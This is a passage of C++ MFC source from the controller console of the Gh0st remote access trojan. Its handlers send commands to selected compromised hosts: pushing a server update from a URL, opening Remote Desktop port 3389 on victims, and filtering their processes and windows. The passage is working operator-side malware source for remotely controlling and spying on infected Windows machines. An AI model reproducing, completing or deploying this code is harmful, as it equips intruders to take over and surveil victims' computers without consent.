		//MessageBox(_T("输入的网址不合法"), _T("错误"));
		//return;
	}

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_UPDATE_SERVER;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}

void Cgh0stView::OnDisconnect()
{
	POSITION pos;
	for (; pos = m_pListCtrl->GetFirstSelectedItemPosition();)
	{
		m_pListCtrl->DeleteItem(m_pListCtrl->GetNextSelectedItem(pos));
	}
}

void Cgh0stView::OnOpen3389()
{
	CInputDialog	dlg;
	dlg.Init(_T("开启3389:"), _T("Example:  3389(注:2000下需重启)"), this);
	if (dlg.DoModal() != IDOK)
		return;
	int		nPacketLength = (dlg.m_str.GetLength() + 2);
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_3389;

	memcpy(lpPacket + 1, (TCHAR*)dlg.m_str.GetBuffer(0), nPacketLength - 1);
	SendSelectCommand(lpPacket, nPacketLength);
	LocalFree(lpPacket);
}

void Cgh0stView::OnSortProcess()
{
	CInputDialog	dlg;
	dlg.Init(_T("进程筛选"), _T("请输入要筛选的进程:"), this);
	if (dlg.DoModal() != IDOK)
		return;
	dlg.m_str.MakeLower();

	int		nPacketLength = (dlg.m_str.GetLength() + 1)*sizeof(TCHAR) + 1;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SORT_PROCESS;
	memcpy(lpPacket + 1, (TCHAR*)dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}

void Cgh0stView::OnSortWindow()
{
	CInputDialog	dlg;
	dlg.Init(_T("窗体筛选"), _T("请输入要筛选的标题关键字:"), this);
	if (dlg.DoModal() != IDOK)
		return;
	dlg.m_str.MakeLower();

	if (lstrlen(dlg.m_str) < 1)
	{
		MessageBox(_T("输入的名称不合法"), _T("错误"));
		return;
	}

	int		nPacketLength = (dlg.m_str.GetLength() + 1)*sizeof(TCHAR) + 1;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SORT_WINDOW;
	memcpy(lpPacket + 1, (TCHAR*)dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}